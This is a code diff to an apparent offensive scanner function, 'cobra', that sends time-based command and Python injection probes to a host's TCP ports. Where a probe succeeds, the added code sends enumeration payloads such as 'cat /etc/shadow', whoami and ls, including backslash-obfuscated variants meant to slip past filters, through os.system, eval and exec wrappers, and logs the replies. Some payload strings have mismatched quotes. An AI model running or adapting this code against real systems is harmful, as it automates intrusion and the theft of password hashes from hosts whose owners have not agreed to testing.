@@ -19,7 +19,16 @@ def cobra(host,delay=0):
     mal_apple_script = [r"delay 60"]
 
     mal_command = [r"sleep 60",
-                   r"sleep \\6\\0"]
+                   r"sleep \6\0"]
+
+    mal_command_enumerate = [r"cat /etc/shadow",
+                             r"cat \/\e\t\c/\s\h\ad\o\w",
+                             r"ls -l -a",
+                             r"\l\s",
+                             r"pwd",
+                             r"\p\w\d",
+                             r"whoami",
+                             r"\w\h\o\a\m\i"]
     
     mal_go_lang = [r'package main;import "time";func main(){time.Sleep(60*time.Second)}']
     
@@ -40,9 +49,9 @@ def cobra(host,delay=0):
     
     mal_powershell = [r"start-sleep -seconds 60"]
 
-    mal_python = [r"return beluga",
-                  r"time.sleep(60)",
-                  r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))"
+    mal_python = [r"time.sleep(60)",
+                  r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))",
+                  r"eval(compile('import os\nos.system('sleep 60')','cobra','exec'))",
                   r"__import__('time').sleep(60)",
                   r"__import__('os').system('sleep 60')",
                   r'eval("__import__(\'time\').sleep(60)")',
@@ -51,6 +60,47 @@ def cobra(host,delay=0):
                   r'exec("__import__(\'os\').system(\'sleep 60\')")',
                   r'exec("import time\ntime.sleep(60)"',
                   r'exec("import os\nos.system(\'sleep 60\')")']
+
+    mal_python_enumerate = [r"eval(compile('import os\nos.system('cat /etc/shadow')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('cat \/\e\t\c/\s\h\ad\o\w')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('ls -l -a')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('\l\s')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('pwd')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('\p\w\d')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('whoami')','cobra','exec'))",
+                            r"eval(compile('import os\nos.system('\w\h\o\a\m\i')','cobra','exec'))",
+                            r"__import__('os').system('cat /etc/shadow')",
+                            r"__import__('os').system('cat \/\e\t\c/\s\h\ad\o\w')",
+                            r"__import__('os').system('ls -l -a')",
+                            r"__import__('os').system('\l\s')",
+                            r"__import__('os').system('pwd')",
+                            r"__import__('os').system('\p\w\d')",
+                            r"__import__('os').system('whoami')",
+                            r"__import__('os').system('\w\h\o\a\m\i')",
+                            r'eval("__import__(\'os\').system(\'cat /etc/shadow\')")',
+                            r'eval("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
+                            r'eval("__import__(\'os\').system(\'ls -l -a\')")',
+                            r'eval("__import__(\'os\').system(\'\l\s\')")',
+                            r'eval("__import__(\'os\').system(\'pwd\')")',
+                            r'eval("__import__(\'os\').system(\'\p\w\d\')")',
+                            r'eval("__import__(\'os\').system(\'whoami\')")',
+                            r'eval("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
+                            r'exec("__import__(\'os\').system(\'cat /etc/shadow\')")',
+                            r'exec("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
+                            r'exec("__import__(\'os\').system(\'ls -l -a\')")',
+                            r'exec("__import__(\'os\').system(\'\l\s\')")',
+                            r'exec("__import__(\'os\').system(\'pwd\')")',
+                            r'exec("__import__(\'os\').system(\'\p\w\d\')")',
+                            r'exec("__import__(\'os\').system(\'whoami\')")',
+                            r'exec("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
+                            r'exec("import os\nos.system(\'cat /etc/shadow\')")',
+                            r'exec("import os\nos.system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
+                            r'exec("import os\nos.system(\'ls -l -a\')")',
+                            r'exec("import os\nos.system(\'\l\s\')")',
+                            r'exec("import os\nos.system(\'pwd\')")',
+                            r'exec("import os\nos.system(\'\p\w\d\')")',
+                            r'exec("import os\nos.system(\'whoami\')")',
+                            r'exec("import os\nos.system(\'\w\h\o\a\m\i\')")']
     
     mal_ruby = [r"sleep(1.minutes)"]
     
@@ -112,10 +162,17 @@ def cobra(host,delay=0):
                 tcp_socket.send(mal.encode())
                 start = time.time()
                 data = tcp_socket.recv(65535)
-                tcp_socket.close()
                 end = time.time()
                 if end - start >= 45:
                     hits.append(f"command injection in port {port}:{mal}- {data}")
+
+                    for mal_enum in mal_command_enumerate:
+                        time.sleep(delay)
+                        tcp_socket.send(mal_enum.encode())
+                        data = tcp_socket.recv(65535)
+                        hits.append(f"command injection in port {port}:{mal_enum}- {data}")
+
+                tcp_socket.close()
 
             except:
                 pass
@@ -282,10 +339,17 @@ def cobra(host,delay=0):
                 tcp_socket.send(mal.encode())
                 start = time.time()
                 data = tcp_socket.recv(65535)
-                tcp_socket.close()
                 end = time.time()
                 if end - start >= 45:
                     hits.append(f"python injection in port {port}:{mal}- {data}")
+
+                    for mal_enum in mal_python_enumerate:
+                        time.sleep(delay)
+                        tcp_socket.send(mal_enum.encode())
+                        data = tcp_socket.recv(65535)
+                        hits.append(f"python injection in port {port}:{mal_enum}- {data}")
+
+                tcp_socket.close()
 
             except:
                 pass
